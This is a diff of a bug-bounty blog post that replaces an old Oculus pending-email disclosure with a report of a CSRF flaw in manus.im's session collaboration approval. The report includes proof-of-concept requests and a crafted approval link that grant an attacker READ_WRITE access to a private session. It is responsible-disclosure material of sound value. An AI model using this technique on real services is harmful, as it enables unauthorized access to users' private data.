@@ -9,46 +9,57 @@ math: true
 mermaid: true
 ---
 
-### 🧾 Description
+### Description
 During a security assessment of manus.im, I discovered that the collaboration approval workflow was vulnerable to Cross-Site Request Forgery (CSRF). An attacker could force a session owner to grant them READ_WRITE access to private AI sessions simply by convincing the victim to click a specially crafted link. This bypasses the need for an explicit user confirmation, leading to potential sensitive data leakage.
 The application handles session collaboration requests via a predictable GET endpoint. When an attacker initiates a collaboration request, the backend generates a requestId. The subsequent approval mechanism relies solely on this requestId and sessionId passed as URL parameters.
 Crucially, the application failed to validate an Anti-CSRF token or perform any secondary authorization check (such as a POST request with a CSRF header) before executing the state-changing operation.
 
-**Impact:** Attackers gain full READ_WRITE permissions to private sessions.
+**Impact:** 
+
+* Unauthorized Access: Attackers gain full READ_WRITE permissions to private sessions.
+* Data Exfiltration: Exposure of proprietary prompts, API configurations, and sensitive AI-generated outputs.
+* Persistence: Once access is granted, the attacker can continue to monitor the session long after the initial click.
 
 ---
 
-## ⚙️ Steps to Reproduce
+## Proof of Concept (Repro Steps)
 
-1. **UserA** adds a new email address to his Oculus profile: `https://secure.oculus.com/my/profile/` (email remains in *pending* state until confirmed).  
-2. **UserB** (Attacker) issues the following GraphQL request, replacing `User_ID` with UserA_ID and using a valid Oculus access token :
+### Step 1: Initiate Malicious Request
+The attacker sends a collaboration request to the target session UID:
 
 #### Request
 ```http
-GET /graphql?q=node(User_ID){pending_email}&access_token=OC|660728964057742| HTTP/1.1
-Host: graph.oculus.com
-User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:62.0) Gecko/20100101 Firefox/62.0
-Accept: */*
-Content-Type: application/x-www-form-urlencoded
-Connection: close
+POST /session.v1.SessionCollaborateService/MemberRequest HTTP/2
+Host: api.manus.im
+Authorization: Bearer [ATTACKER_JWT]
+
+{
+  "sessionUid": "ZbvYYgqJIEs1kR0lxsi9qz",
+  "permission": "COLLABORATOR_PERMISSION_READ_WRITE",
+  "message": "View my project?"
+}
 ```
 
-#### Response (example)
+### Step 2: Extract Request ID
+The server returns a JSON response containing the unique identifier for the request:
 ```json
-{"User_ID":{"pending_email":"pending_email@email.User_ID.com"}}
+{"requestId": "NT2CUAk6pijzMeyf9KBVpG"}
 ```
 
-**Result:** The attacker retrieves the victim's pending email address without authorization.
+### Step 3: Craft the Payload
 
----
+The attacker constructs a link targeting the victim (the session owner). When the victim clicks this link while authenticated, the browser automatically sends the session cookies to the server, and the action is processed:
 
+```url
+https://manus.im/collaborate-access?type=approve&sessionId=ZbvYYgqJIEs1kR0lxsi9qz&requestId=NT2CUAk6pijzMeyf9KBVpG](https://manus.im/collaborate-access?type=approve&sessionId=ZbvYYgqJIEs1kR0lxsi9qz&requestId=NT2CUAk6pijzMeyf9KBVpG)
+```
 ---
 
 ## Timeline
 
-- **Reported:** May 22, 2018 
-- **Triaged:** May 23, 2018 
-- **Fixed:** June 16, 2018  
-- **Reward:** June 20, 2018 - $1,500
+- **Reported:** Feburay 4, 2026 
+- **Triaged:** Feburay 16, 2026 
+- **Fixed:** April 18, 2026  
+- **Reward:** April 24 2026
 
 ---
